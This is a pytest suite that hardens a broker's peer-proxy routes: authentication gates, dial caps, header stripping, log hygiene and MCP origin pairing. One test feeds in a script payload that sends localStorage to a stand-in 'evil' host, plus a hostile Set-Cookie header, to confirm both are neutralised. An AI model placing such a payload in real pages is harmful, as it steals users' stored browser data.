"""#252 phase 1, atom 3: the /peer/<id>/ route family on a live broker.

Broker A is a real ``create_app`` served on a free port in its own thread
(``LiveApp``), so requests can be concurrent (the dial cap) and the client can
read a body while it streams. Broker B is the recording fake upstream. Every
refusal is asserted together with the upstream hit count it must leave at 0.
"""

from __future__ import annotations

import json
import socket
import sys
import threading

import httpx
import pytest

from .auth_helpers import TEST_TOKEN
from .peer_upstream import Answer, FakeUpstream, LiveApp, json_answer
from webterm.broker import peers
from webterm.broker.app import ADMIN_HEADER, create_app
from webterm.protocol import MCP_ADMIN_HEADER, SCOPE_HEADER

B_TOKEN = "b-browser-token"
B_MCP = "b-mcp-token"
_seq = 0


def _dead_origin() -> str:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
    return f"http://127.0.0.1:{port}"


def _make_app(tmp_path, peer_map, **cfg):
    global _seq
    _seq += 1
    base = {"state_path": str(tmp_path / "webterm_state.json"),
            "auth_token": TEST_TOKEN, "serve_ui": False, "peers": peer_map}
    base.update(cfg)
    return create_app(base, port=4999, name=f"webterm-peer-proxy-{_seq}")


@pytest.fixture(scope="module")
def upstream():
    up = FakeUpstream().start()
    yield up
    up.stop()


@pytest.fixture(scope="module")
def live(upstream, tmp_path_factory):
    tmp = tmp_path_factory.mktemp("peer-a")
    (tmp / "a-only-marker.txt").write_text("A's disk", encoding="utf-8")
    peer_map = {pid: {"origin": upstream.origin}
                for pid in ("b", "c", "d", "e", "f")}
    peer_map["m"] = {"origin": upstream.origin, "mcp": True}
    for pid in ("m2", "m3", "m4"):
        peer_map[pid] = {"origin": upstream.origin, "mcp": True}
    peer_map["dead"] = {"origin": _dead_origin()}
    app = _make_app(tmp, peer_map)
    srv = LiveApp(app).start()
    srv.tmp = tmp
    yield srv
    srv.stop()


@pytest.fixture(autouse=True)
def _fresh(upstream):
    upstream.seen.clear()
    upstream.routes.clear()
    upstream.gate_timed_out = False


def browser(origin, *, a=TEST_TOKEN, b=B_TOKEN, extra=None):
    h = {}
    if a is not None:
        h["Authorization"] = "Bearer " + a
    if b is not None:
        h[peers.PEER_TOKEN_HEADER] = b
    if origin is not None:
        h[peers.PEER_ORIGIN_HEADER] = origin
    h.update(extra or {})
    return h


def _client():
    return httpx.AsyncClient(timeout=30, trust_env=False,
                             limits=httpx.Limits(max_connections=100))


async def _get(live, path, headers=None, method="GET", **kw):
    async with _client() as c:
        return await c.request(method, live.url + path, headers=headers, **kw)


def _hardened(r):
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["Content-Security-Policy"] == peers.SANDBOX_CSP


# ---- the browser gate ---------------------------------------------------------

async def test_both_credentials_relay_to_b(live, upstream):
    r = await _get(live, "/peer/b/info?x=1&token=" + TEST_TOKEN,
                   browser(upstream.origin))
    assert r.status_code == 200, r.text
    assert r.json()["broker_id"] == "fake-b"
    assert r.headers["Content-Type"] == "application/json"
    _hardened(r)
    seen = upstream.seen[-1]
    assert seen.target == "/info?x=1"                # A's ?token= stripped
    assert seen.one("Authorization") == "Bearer " + B_TOKEN
    assert TEST_TOKEN not in json.dumps(seen.headers)


@pytest.mark.parametrize("label,hdrs", [
    ("A only", dict(b=None)),
    ("peer token only", dict(a=None)),
    ("wrong A", dict(a="nope")),
    ("neither", dict(a=None, b=None)),
])
async def test_each_credential_alone_is_401(live, upstream, label, hdrs):
    r = await _get(live, "/peer/b/info", browser(upstream.origin, **hdrs))
    assert r.status_code == 401
    assert r.json() == {"ok": False, "error": "auth_required"}
    _hardened(r)
    assert upstream.seen == []


async def test_a_query_token_does_not_open_the_prefix(live, upstream):
    r = await _get(live, "/peer/b/info?token=" + TEST_TOKEN,
                   browser(upstream.origin, a=None))
    assert r.status_code == 401
    assert upstream.seen == []


@pytest.mark.parametrize("origin", [None, "http://127.0.0.1:1", ""])
async def test_a_missing_or_stale_pairing_is_409_without_a_dial(
        live, upstream, origin):
    r = await _get(live, "/peer/b/info", browser(origin))
    assert r.status_code == 409
    assert r.json() == {"ok": False, "error": "peer_origin_changed"}
    assert upstream.seen == []


async def test_unknown_peer_is_a_json_404(live, upstream):
    r = await _get(live, "/peer/zz/info", browser(upstream.origin))
    assert r.status_code == 404
    assert r.json() == {"ok": False, "error": "unknown_peer"}
    _hardened(r)
    assert upstream.seen == []


@pytest.mark.parametrize("path,error", [
    ("/peer/b/", "not_relayed"), ("/peer/b", "not_relayed"),
    # Phase 2: /peer/b/ws and /peer/b/control are socket routes now (a
    # non-upgrade GET there is pinned in test_peer_ws_routes).
    ("/peer/b/state", "not_relayed"), ("/peer/b/browserland", "not_relayed"),
    ("/peer/b/status/fetch", "not_relayed"),
    ("/peer/b/peer/c/info", "peer_hop_refused"),
    ("/peer/b/mod-store/a%2Fpeer%2Fb", "peer_hop_refused"),
])
async def test_unlisted_paths_never_dial(live, upstream, path, error):
    r = await _get(live, path, browser(upstream.origin))
    assert r.status_code == 404
    assert r.json() == {"ok": False, "error": error}
    _hardened(r)
    assert upstream.seen == []


async def test_options_is_not_relayed(live, upstream):
    r = await _get(live, "/peer/b/info", method="OPTIONS")
    assert r.status_code == 405
    assert upstream.seen == []


async def test_put_state_is_not_relayed(live, upstream):
    r = await _get(live, "/peer/b/state", browser(upstream.origin),
                   method="PUT", content=b"{}")
    assert r.status_code == 404
    assert upstream.seen == []


async def test_encoded_path_is_dialed_canonical(live, upstream):
    r = await _get(live, "/peer/b/inf%6F", browser(upstream.origin))
    assert r.status_code == 200
    assert upstream.seen[-1].path == "/info"


async def test_file_list_on_the_prefix_is_bs_files(live, upstream):
    body = json.dumps({"path": str(live.tmp)}).encode()
    r = await _get(live, "/peer/b/file/list",
                   browser(upstream.origin,
                           extra={"Content-Type": "application/json"}),
                   method="POST", content=body)
    assert r.status_code == 200, r.text
    assert "a-only-marker" not in r.text
    assert r.json() == {"ok": True, "broker_id": "fake-b",
                        "path": "/file/list", "method": "POST"}
    assert upstream.seen[-1].body == body


async def test_admin_and_scope_headers_cross_on_the_browser_gate(live,
                                                                 upstream):
    r = await _get(live, "/peer/b/mods/policy",
                   browser(upstream.origin, extra={
                       ADMIN_HEADER: "b-admin", SCOPE_HEADER: "s1",
                       MCP_ADMIN_HEADER: "b-mcp-admin",
                       "Content-Type": "application/json"}),
                   method="POST", content=b'{"set": {}}')
    assert r.status_code == 200
    seen = upstream.seen[-1]
    assert seen.one(ADMIN_HEADER) == "b-admin"
    assert seen.one(SCOPE_HEADER) == "s1"
    assert seen.one(MCP_ADMIN_HEADER) is None


# ---- the MCP gate ----------------------------------------------------------------

async def test_mcp_prefix_is_404_unless_the_peer_opts_in(live, upstream):
    r = await _get(live, "/peer/b/mcp/terminals",
                   {"Authorization": "Bearer " + B_MCP})
    assert r.status_code == 404
    assert r.json() == {"error": "unknown_peer"}
    assert upstream.seen == []


async def test_mcp_gate_takes_bs_mcp_token_alone(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals", {
        "Authorization": "Bearer " + B_MCP, MCP_ADMIN_HEADER: "b-mcp-admin",
        SCOPE_HEADER: "s1"})
    assert r.status_code == 200, r.text
    seen = upstream.seen[-1]
    assert seen.path == "/mcp/terminals"
    assert seen.one("Authorization") == "Bearer " + B_MCP
    assert seen.one(MCP_ADMIN_HEADER) == "b-mcp-admin"
    assert seen.one(SCOPE_HEADER) == "s1"
    assert seen.one(ADMIN_HEADER) is None


async def test_mcp_gate_without_a_bearer_is_401(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals")
    assert r.status_code == 401
    assert r.json() == {"error": "auth_required"}
    assert upstream.seen == []


async def test_a_repeated_scope_is_400_without_a_dial(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals", [
        ("Authorization", "Bearer " + B_MCP), (SCOPE_HEADER, "s1"),
        (SCOPE_HEADER, "s2")])
    assert r.status_code == 400
    assert r.json() == {"error": "bad_scope"}
    assert upstream.seen == []


# ---- response hardening on the wire -------------------------------------------------

async def test_html_from_b_reaches_the_client_as_octet_stream(live, upstream):
    upstream.routes["/info"] = lambda s: Answer(
        200, [("Content-Type", "text/html"), ("Set-Cookie", "sid=evil"),
              ("Access-Control-Allow-Credentials", "true")],
        b"<script>fetch('//evil/'+JSON.stringify(localStorage))</script>")
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 200
    assert r.headers["Content-Type"] == "application/octet-stream"
    _hardened(r)
    assert "set-cookie" not in r.headers
    assert "access-control-allow-credentials" not in r.headers
    # A's own CORS answer is the only ACAO on the wire.
    assert r.headers.get_list("Access-Control-Allow-Origin") == ["*"]


async def test_a_redirect_is_relayed_without_location(live, upstream):
    upstream.routes["/info"] = lambda s: Answer(
        302, [("Location", upstream.origin + "/redirect-target")])
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 302
    assert "location" not in r.headers
    assert upstream.hits("/redirect-target") == 0


async def test_twenty_mib_streams_through_the_route(live, upstream):
    size = 20 * 2**20
    blob = bytes(range(256)) * (size // 256)
    first = threading.Event()
    upstream.routes["/recording"] = lambda s: Answer(
        200, [("Content-Type", "application/octet-stream")], blob,
        gate=first, gate_timeout=10)
    got = bytearray()
    async with _client() as c:
        async with c.stream("GET", live.url + "/peer/b/recording?id=r1",
                            headers=browser(upstream.origin)) as r:
            assert r.status_code == 200
            async for chunk in r.aiter_raw():
                got += chunk
                first.set()
    assert upstream.gate_timed_out is False
    assert bytes(got) == blob


async def test_a_down_peer_is_502(live):
    r = await _get(live, "/peer/dead/info", browser(
        live.app.ctx.peers["dead"]["origin"]))
    assert r.status_code == 502
    assert r.json() == {"ok": False, "error": "peer_unreachable"}
    _hardened(r)


# ---- the dial cap ---------------------------------------------------------------------

async def _hold_on(live, upstream, pids, per):
    """Start `per` held dials to each peer id; returns (tasks, release)."""
    import asyncio
    release = threading.Event()
    upstream.routes["/sessions"] = lambda s: Answer(
        200, [("Content-Type", "application/json")], b"[]", hold=release)
    client = _client()
    tasks = [asyncio.ensure_future(client.get(
        live.url + f"/peer/{pid}/sessions", headers=browser(upstream.origin)))
        for pid in pids for _ in range(per)]
    for _ in range(200):
        if upstream.hits("/sessions") >= len(tasks):
            break
        await asyncio.sleep(0.05)
    return client, tasks, release


async def test_one_peer_cannot_take_every_slot(live, upstream):
    client, tasks, release = await _hold_on(live, upstream, ["b"],
                                            peers.PEER_MAX_DIALS_PER_PEER)
    try:
        assert upstream.hits("/sessions") == 8
        r = await client.get(live.url + "/peer/b/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 503
        assert r.json() == {"ok": False, "error": "peer_busy"}
        assert upstream.hits("/info") == 0
        r = await client.get(live.url + "/peer/c/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 200
    finally:
        release.set()
        for t in tasks:
            assert (await t).status_code == 200
        await client.aclose()


async def test_the_global_cap_holds_across_peers(live, upstream):
    client, tasks, release = await _hold_on(live, upstream,
                                            ["b", "c", "d", "e"], 8)
    try:
        assert upstream.hits("/sessions") == peers.PEER_MAX_DIALS == 32
        r = await client.get(live.url + "/peer/f/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 503
        assert r.json()["error"] == "peer_busy"
    finally:
        release.set()
        for t in tasks:
            await t
        await client.aclose()
    # Every slot came back.
    assert live.app.ctx.peer_cap._busy == {}


# ---- without the proxy extra ------------------------------------------------------------

async def test_missing_extra_is_503(tmp_path, upstream, monkeypatch):
    with monkeypatch.context() as m:
        # Simulated absence, for create_app's probe only (httpx is in the
        # test interpreter via mcp and sanic-testing).
        m.setitem(sys.modules, "httpx", None)
        app = _make_app(tmp_path, {"b": {"origin": upstream.origin},
                                   "m": {"origin": upstream.origin,
                                         "mcp": True}})
    assert app.ctx.peer_proxy is False
    srv = LiveApp(app).start()
    try:
        r = await _get(srv, "/peer/b/info", browser(upstream.origin))
        assert r.status_code == 503
        assert r.json() == {"ok": False, "error": "proxy_unavailable"}
        # Round 1b: 401 before 503 before 404 on the browser gate.
        r = await _get(srv, "/peer/b/info", browser(upstream.origin, a=None))
        assert r.status_code == 401
        r = await _get(srv, "/peer/zz/info", browser(upstream.origin))
        assert (r.status_code, r.json()["error"]) == (503,
                                                      "proxy_unavailable")
        r = await _get(srv, "/peer/m/mcp/info",
                       {"Authorization": "Bearer " + B_MCP})
        assert r.status_code == 503
        assert r.json() == {"error": "proxy_unavailable"}
    finally:
        srv.stop()
    assert upstream.seen == []


@pytest.mark.parametrize("shim", ["websockets-12", "no-asyncio-client"])
async def test_websockets_below_15_is_proxy_unavailable(tmp_path, upstream,
                                                        monkeypatch, shim):
    # Q11: core needs websockets 12; the proxy's sockets need 15 (the extra).
    import types
    with monkeypatch.context() as m:
        if shim == "websockets-12":
            old = types.ModuleType("websockets")
            old.__version__ = "12.0"
            m.setitem(sys.modules, "websockets", old)
        else:
            m.setitem(sys.modules, "websockets.asyncio.client", None)
        assert peers.proxy_available() is False
        app = _make_app(tmp_path, {"b": {"origin": upstream.origin}})
    assert peers.proxy_available() is True
    assert app.ctx.peer_proxy is False
    srv = LiveApp(app).start()
    try:
        r = await _get(srv, "/info", {"Authorization": "Bearer " + TEST_TOKEN})
        assert r.status_code == 200 and r.json()["peer_proxy"] is False
        r = await _get(srv, "/peer/b/info", browser(upstream.origin))
        assert r.status_code == 503
        assert r.json() == {"ok": False, "error": "proxy_unavailable"}
    finally:
        srv.stop()
    assert upstream.seen == []


# ---- R4: nothing logs the upstream URL ------------------------------------------------

async def test_no_log_record_names_the_upstream(live, upstream, caplog):
    import logging
    with caplog.at_level(logging.DEBUG):
        r = await _get(live, "/peer/b/recording?id=secret-q",
                       browser(upstream.origin))
        assert r.status_code == 200
        dead = live.app.ctx.peers["dead"]["origin"]
        r = await _get(live, "/peer/dead/info?id=secret-q", browser(dead))
        assert r.status_code == 502
    text = "\n".join(rec.getMessage() for rec in caplog.records)
    assert "peer dead: GET /info failed" in text
    for secret in (str(upstream.port), dead.rsplit(":", 1)[1], "secret-q",
                   B_TOKEN, TEST_TOKEN, "http://"):
        assert secret not in text, secret


async def test_a_body_cut_short_upstream_never_arrives_complete(live,
                                                               upstream):
    # Chunked upstream, cut after the first piece with no terminating chunk:
    # no length can reveal the cut, so only dropping the downstream
    # connection keeps the client from reading a short body as complete.
    blob = b"x" * (2 * 2**20)
    upstream.routes["/recording"] = lambda s: Answer(
        200, [("Content-Type", "application/octet-stream")],
        blob, gate=threading.Event(), gate_timeout=0.5, chunked=True)
    got = bytearray()
    with pytest.raises(httpx.HTTPError):
        async with _client() as c:
            async with c.stream("GET", live.url + "/peer/b/recording?id=r",
                                headers=browser(upstream.origin)) as r:
                assert r.status_code == 200
                async for chunk in r.aiter_raw():
                    got += chunk
    assert len(got) < len(blob)
    # ...and the slot came back.
    assert live.app.ctx.peer_cap._busy == {}


async def test_without_a_bearer_the_mcp_prefix_reveals_nothing(live,
                                                               upstream):
    seen = []
    for pid in ("m", "b", "zz"):       # opted in, opted out, unknown
        r = await _get(live, f"/peer/{pid}/mcp/info")
        seen.append((r.status_code, r.json(),
                     r.headers.get(peers.PEER_REFUSAL_HEADER)))
    assert seen == [(401, {"error": "auth_required"}, "auth_required")] * 3
    assert upstream.seen == []


async def test_the_refusal_marker_is_ours_alone(live, upstream):
    r = await _get(live, "/peer/b/info", browser("http://elsewhere:1"))
    assert r.status_code == 409
    assert r.headers[peers.PEER_REFUSAL_HEADER] == "peer_origin_changed"
    # B sending the same marker (and the same body) does not get it across.
    upstream.routes["/sessions"] = lambda s: Answer(
        409, [("Content-Type", "application/json"),
              (peers.PEER_REFUSAL_HEADER, "peer_origin_changed")],
        b'{"ok": false, "error": "peer_origin_changed"}')
    r = await _get(live, "/peer/b/sessions", browser(upstream.origin))
    assert r.status_code == 409
    assert peers.PEER_REFUSAL_HEADER not in r.headers


async def test_a_client_that_leaves_mid_body_frees_its_slot(live, upstream):
    import asyncio
    blob = b"y" * (4 * 2**20)
    hold = threading.Event()
    upstream.routes["/recording"] = lambda s: Answer(
        200, [("Content-Type", "application/octet-stream")], blob,
        gate=hold, gate_timeout=10, chunked=True)
    try:
        async with _client() as c:
            async with c.stream("GET", live.url + "/peer/b/recording?id=r",
                                headers=browser(upstream.origin)) as r:
                async for _chunk in r.aiter_raw():
                    break              # leave after the first piece
        for _ in range(100):
            if live.app.ctx.peer_cap._busy == {}:
                break
            await asyncio.sleep(0.05)
        assert live.app.ctx.peer_cap._busy == {}
    finally:
        hold.set()
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 200



async def test_a_cookie_from_b_never_reaches_another_users_request(live,
                                                                   upstream):
    """Round 1 MUST: one upstream client serves every user. B's Set-Cookie
    on user X's answer must not ride user Y's next request."""
    upstream.routes["/sessions"] = lambda s: Answer(
        200, [("Content-Type", "application/json"),
              ("Set-Cookie", "sid=user-x-session; Path=/")], b"[]")
    r = await _get(live, "/peer/b/sessions",
                   browser(upstream.origin, b="user-x-token"))
    assert r.status_code == 200
    r = await _get(live, "/peer/b/info",
                   browser(upstream.origin, b="user-y-token"))
    assert r.status_code == 200
    seen = upstream.seen[-1]
    assert seen.path == "/info"
    assert seen.all("Cookie") == []
    assert seen.all("User-Agent") == []



# ---- round 1b ----------------------------------------------------------------------

def _stalled_mcp_post(port, pid="m"):
    """An unauthenticated-to-A caller: a junk bearer, a declared body, one
    byte of it, then nothing."""
    s = socket.create_connection(("127.0.0.1", port))
    s.sendall(f"POST /peer/{pid}/mcp/read HTTP/1.1\r\nHost: a\r\n"
              f"Authorization: Bearer junk\r\n"
              f"Content-Type: application/json\r\n"
              f"Content-Length: 100\r\n\r\n{{".encode())
    return s


async def test_stalled_mcp_bodies_hold_no_slot(live, upstream, monkeypatch):
    """MUST 1: the MCP gate reads the body BEFORE a slot. Eight callers who
    stall mid-body hold nothing: the browser gate and a real MCP caller still
    get through, and every stalled one is answered 408 without a dial."""
    import asyncio
    monkeypatch.setattr(peers, "PEER_MCP_BODY_DEADLINE_S", 2.0)
    socks = [_stalled_mcp_post(live.port) for _ in range(8)]
    try:
        await asyncio.sleep(0.3)
        assert live.app.ctx.peer_mcp_cap._busy == {}
        assert live.app.ctx.peer_cap._busy == {}
        r = await _get(live, "/peer/b/info", browser(upstream.origin))
        assert r.status_code == 200
        r = await _get(live, "/peer/m/mcp/info",
                       {"Authorization": "Bearer " + B_MCP})
        assert r.status_code == 200
        for s in socks:
            s.settimeout(10)
            head = s.recv(4096)
            assert head.startswith(b"HTTP/1.1 408"), head[:60]
            assert b'"body_timeout"' in head or b"body_timeout" in (
                head + s.recv(4096))
    finally:
        for s in socks:
            s.close()
    assert upstream.hits("/mcp/read") == 0


async def test_mcp_dials_cannot_take_a_browser_slot(live, upstream):
    """MUST 1: 32 junk-bearer dials to 4 opted-in peers that never answer
    fill only the MCP gate's own pool (2 per peer, 8 overall); a live
    peer's browser gate still answers."""
    import asyncio
    hold = threading.Event()
    upstream.routes["/mcp/terminals"] = lambda s: Answer(
        200, [("Content-Type", "application/json")], b"[]", hold=hold)
    client = _client()
    tasks = [asyncio.ensure_future(client.get(
        live.url + f"/peer/{pid}/mcp/terminals",
        headers={"Authorization": "Bearer junk"}))
        for pid in ("m", "m2", "m3", "m4") for _ in range(8)]
    try:
        for _ in range(200):
            if upstream.hits("/mcp/terminals") >= 8:
                break
            await asyncio.sleep(0.05)
        await asyncio.sleep(0.2)
        assert upstream.hits("/mcp/terminals") == peers.PEER_MCP_MAX_DIALS
        assert sum(live.app.ctx.peer_mcp_cap._busy.values()) == 8
        assert live.app.ctx.peer_cap._busy == {}
        r = await client.get(live.url + "/peer/b/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 200
    finally:
        hold.set()
        done = [await t for t in tasks]
        await client.aclose()
    assert sorted({d.status_code for d in done}) == [200, 503]
    assert live.app.ctx.peer_mcp_cap._busy == {}


@pytest.mark.parametrize("chunked", [False, True])
async def test_an_oversized_mcp_body_is_413_without_a_dial(live, upstream,
                                                           chunked):
    big = b"x" * (peers.PEER_MCP_MAX_BODY + 1)

    async def gen():
        for i in range(0, len(big), 65536):
            yield big[i:i + 65536]

    r = await _get(live, "/peer/m/mcp/read",
                   {"Authorization": "Bearer " + B_MCP,
                    "Content-Type": "application/json"},
                   method="POST", content=gen() if chunked else big)
    assert r.status_code == 413
    assert r.json() == {"error": "body_too_large"}
    assert upstream.hits("/mcp/read") == 0


async def test_a_bodiless_get_never_forwards_a_content_length(live, upstream,
                                                              caplog):
    """SHOULD 2: a GET that declares a body is relayed without the length
    (it would break the upstream framing); no traceback either way."""
    import asyncio
    import logging
    with caplog.at_level(logging.INFO):
        r = await _get(live, "/peer/b/info", browser(upstream.origin),
                       content=b"12345")
        # Sanic logs an unread body AFTER the response has gone out; give
        # that line time to land before looking for it.
        await asyncio.sleep(0.5)
    assert r.status_code == 200
    _hardened(r)
    assert upstream.seen[-1].all("Content-Length") == []
    errors = [x.getMessage() for x in caplog.records
              if x.levelno >= logging.ERROR]
    assert not [m for m in errors if "body not consumed" in m], errors
    assert not [x for x in caplog.records if x.exc_info], errors


async def test_every_peer_answer_is_no_store(live, upstream):
    """SHOULD 3: a peer cannot pin its answers in the browser."""
    upstream.routes["/sessions"] = lambda s: Answer(
        200, [("Content-Type", "application/json"),
              ("Cache-Control", "public, max-age=3600"), ("ETag", '"pin"'),
              ("Last-Modified", "Tue, 13 Oct 2026 00:00:00 GMT"),
              ("Expires", "Thu, 01 Jan 2099 00:00:00 GMT"), ("Age", "1")],
        b"[]")
    r = await _get(live, "/peer/b/sessions", browser(upstream.origin))
    assert r.status_code == 200
    assert r.headers["Cache-Control"] == "no-store"
    for gone in ("etag", "last-modified", "expires", "age"):
        assert gone not in r.headers
    r = await _get(live, "/peer/b/info", browser(upstream.origin, a=None))
    assert r.status_code == 401
    assert r.headers["Cache-Control"] == "no-store"


async def test_a_dripping_peer_hits_the_dial_ceiling(live, upstream,
                                                     monkeypatch):
    """SHOULD 4: a peer that sends a header line every 0.2 s never trips
    the read gap; the whole-dial ceiling ends it and frees the slot."""
    monkeypatch.setattr(peers, "PEER_DIAL_MAX_S", 1.0)
    upstream.routes["/info"] = lambda s: Answer(drip_every=0.2, drip_head=20)
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 504
    assert r.json() == {"ok": False, "error": "peer_timeout"}
    assert live.app.ctx.peer_cap._busy == {}


async def test_a_declared_oversize_mcp_body_is_refused_unread(live, upstream):
    """The declared length alone decides: A answers 413 at once, without
    waiting for (or reading) a body it would refuse anyway."""
    import asyncio
    s = socket.create_connection(("127.0.0.1", live.port))
    try:
        s.sendall(("POST /peer/m/mcp/read HTTP/1.1\r\nHost: a\r\n"
                   "Authorization: Bearer junk\r\n"
                   "Content-Length: %d\r\n\r\n{" % (peers.PEER_MCP_MAX_BODY
                                                     * 2)).encode())
        s.settimeout(1.5)
        head = await asyncio.get_running_loop().run_in_executor(
            None, s.recv, 4096)
    finally:
        s.close()
    assert head.startswith(b"HTTP/1.1 413"), head[:60]
    assert upstream.hits("/mcp/read") == 0



# ---- the MCP gate's pairing (#252 phase 3, A9) ---------------------------------

def _mcp(origin=None, bearer=B_MCP):
    h = {}
    if bearer is not None:
        h["Authorization"] = "Bearer " + bearer
    if origin is not None:
        h[peers.PEER_ORIGIN_HEADER] = origin
    return h


async def test_the_mcp_gate_relays_a_matching_pairing(live, upstream):
    """P3-7: an mcptool host configured with the peer's origin sends it; it
    matches, the call is relayed, and the header itself never crosses."""
    r = await _get(live, "/peer/m/mcp/terminals", _mcp(upstream.origin))
    assert r.status_code == 200, r.text
    assert upstream.hits("/mcp/terminals") == 1
    assert upstream.seen[-1].one(peers.PEER_ORIGIN_HEADER) is None


async def test_the_mcp_gate_without_the_pairing_relays_as_before(live,
                                                                upstream):
    r = await _get(live, "/peer/m/mcp/terminals", _mcp())
    assert r.status_code == 200, r.text
    assert upstream.hits("/mcp/terminals") == 1


@pytest.mark.parametrize("sent", ["http://elsewhere:4445", ""])
async def test_a_stale_mcp_pairing_is_409_without_a_dial(live, upstream,
                                                         sent):
    """A sent pairing that is not the configured origin -- an empty one
    included -- is refused before any dial, with this broker's marker."""
    r = await _get(live, "/peer/m/mcp/terminals", _mcp(sent))
    assert r.status_code == 409
    assert r.json() == {"error": "peer_origin_changed"}
    assert r.headers[peers.PEER_REFUSAL_HEADER] == "peer_origin_changed"
    _hardened(r)
    assert upstream.seen == []


async def test_the_mcp_pairing_rung_sits_after_the_gate_and_the_table(
        live, upstream):
    """S8, as amended by round 1b S1: no bearer is still 401 first, a peer
    that did not opt in is still 404 unknown_peer, and a path off the table
    is the table's 404 `not_relayed` WHATEVER the pairing header says -- a
    junk bearer cannot use it to test a guessed origin. Only a relayed path
    reaches the pairing (409 for a wrong one). Nothing is dialed."""
    r = await _get(live, "/peer/m/mcp/terminals",
                   _mcp("http://elsewhere:4445", bearer=None))
    assert r.status_code == 401
    r = await _get(live, "/peer/b/mcp/terminals",
                   _mcp("http://elsewhere:4445"))
    assert (r.status_code, r.json()) == (404, {"error": "unknown_peer"})
    for guess in ("http://elsewhere:4445", upstream.origin):
        r = await _get(live, "/peer/m/mcp/nowhere", _mcp(guess, bearer="junk"))
        assert (r.status_code, r.json()) == (404, {"error": "not_relayed"})
        assert peers.PEER_REFUSAL_HEADER in r.headers
    r = await _get(live, "/peer/m/mcp/terminals",
                   _mcp("http://elsewhere:4445", bearer="junk"))
    assert (r.status_code, r.json()) == (409, {"error": "peer_origin_changed"})
    assert upstream.seen == []


async def test_the_mcptool_client_and_the_gate_agree_on_the_pairing(
        live, upstream):
    """M1: the header the mcptool client sends is the one this gate reads --
    a matching pairing is relayed, a stale one is refused before any dial."""
    import asyncio
    from webterm.mcptool import BrowserlandClient, BrowserlandError
    upstream.routes["/mcp/terminals"] = lambda s: json_answer({"ok": True})

    def call(origin):
        c = BrowserlandClient(base=live.url + "/peer/m", token=B_MCP,
                              peer_origin=origin)
        try:
            return c._send("GET", "/mcp/terminals")
        except BrowserlandError as exc:
            return exc.code
        finally:
            c.close()
    loop = asyncio.get_running_loop()
    good = await loop.run_in_executor(None, call, upstream.origin)
    assert good == {"ok": True}
    assert upstream.hits("/mcp/terminals") == 1
    stale = await loop.run_in_executor(None, call, "http://elsewhere:4445")
    assert stale == "peer_origin_changed"
    assert upstream.hits("/mcp/terminals") == 1



@pytest.mark.parametrize("name", [peers.PEER_REFUSAL_HEADER,
                                  peers.PEER_REFUSAL_HEADER.lower(),
                                  peers.PEER_REFUSAL_HEADER.upper()])
async def test_a_peer_cannot_send_this_brokers_401_marker(live, upstream,
                                                          name):
    """#252 phase 3 (codex 8): the page reads a 401 WITH this broker's marker
    as this broker refusing its own password (A4). B's own 401 carrying the
    marker, in any letter case, must arrive without it -- or B could open
    this broker's login and hide its own refusal."""
    upstream.routes["/sessions"] = lambda s: Answer(
        401, [("Content-Type", "application/json"), (name, "auth_required")],
        b'{"ok": false, "error": "auth_required"}')
    r = await _get(live, "/peer/b/sessions", browser(upstream.origin))
    assert r.status_code == 401
    assert peers.PEER_REFUSAL_HEADER not in r.headers


# ---- #261: what an agent sees through a hub ------------------------------

def _hub_client(live, peer, token=B_MCP, **kw):
    from webterm.mcptool import BrowserlandClient
    return BrowserlandClient(base=live.url + "/peer/" + peer, token=token, **kw)


async def test_a_waiting_read_screen_fills_the_peers_two_dials(live, upstream):
    """#261: two waiting read_screens hold both of a peer's MCP dials; a
    third call is refused at once with the client's peer_busy text, is never
    dialed and never queued, and the hub's pool drains when they finish."""
    import asyncio
    from webterm.mcptool import BrowserlandError
    from webterm.mcptool.client import _ERROR_MESSAGES
    release = threading.Event()
    upstream.routes["/mcp/read"] = lambda s: Answer(
        200, [("Content-Type", "application/json")], b"{}", hold=release)

    def read():
        c = _hub_client(live, "m")
        try:
            return c.read_screen(1, wait_for_change="x", timeout_ms=15000)
        except BrowserlandError as exc:
            return exc
        finally:
            c.close()

    loop = asyncio.get_running_loop()
    held = [loop.run_in_executor(None, read) for _ in range(2)]
    try:
        for _ in range(200):
            if upstream.hits("/mcp/read") >= 2:
                break
            await asyncio.sleep(0.05)
        assert upstream.hits("/mcp/read") == 2
        third = await loop.run_in_executor(None, read)
        assert isinstance(third, BrowserlandError), third
        assert (third.code, third.status) == ("peer_busy", 503)
        assert str(third) == _ERROR_MESSAGES["peer_busy"] + " (HTTP 503)"
        # the refused call never dialed, and nothing queued behind the two
        assert upstream.hits("/mcp/read") == 2
    finally:
        release.set()
    assert await asyncio.gather(*held) == [{}, {}]
    for _ in range(40):
        if not live.app.ctx.peer_mcp_cap._busy:
            break
        await asyncio.sleep(0.05)
    assert live.app.ctx.peer_mcp_cap._busy == {}


async def test_a_peer_without_mcp_reads_the_enable_text(live, upstream):
    """#261: peer "b" is in the hub's /info but not set to mcp:true; a host
    pointed at it (with a real token, not the Copy placeholder) is told how
    to enable it, and nothing is dialed."""
    import asyncio
    from webterm.mcptool import BrowserlandError

    def call():
        c = _hub_client(live, "b", token="a-real-token")
        try:
            return c.list_terminals()
        except BrowserlandError as exc:
            return exc
        finally:
            c.close()

    err = await asyncio.get_running_loop().run_in_executor(None, call)
    assert isinstance(err, BrowserlandError), err
    assert (err.code, err.status) == ("unknown_peer", 404)
    text = " ".join(str(err).split())
    assert 'Set "mcp": true on that peer' in text and "restart the hub" in text
    assert upstream.seen == []
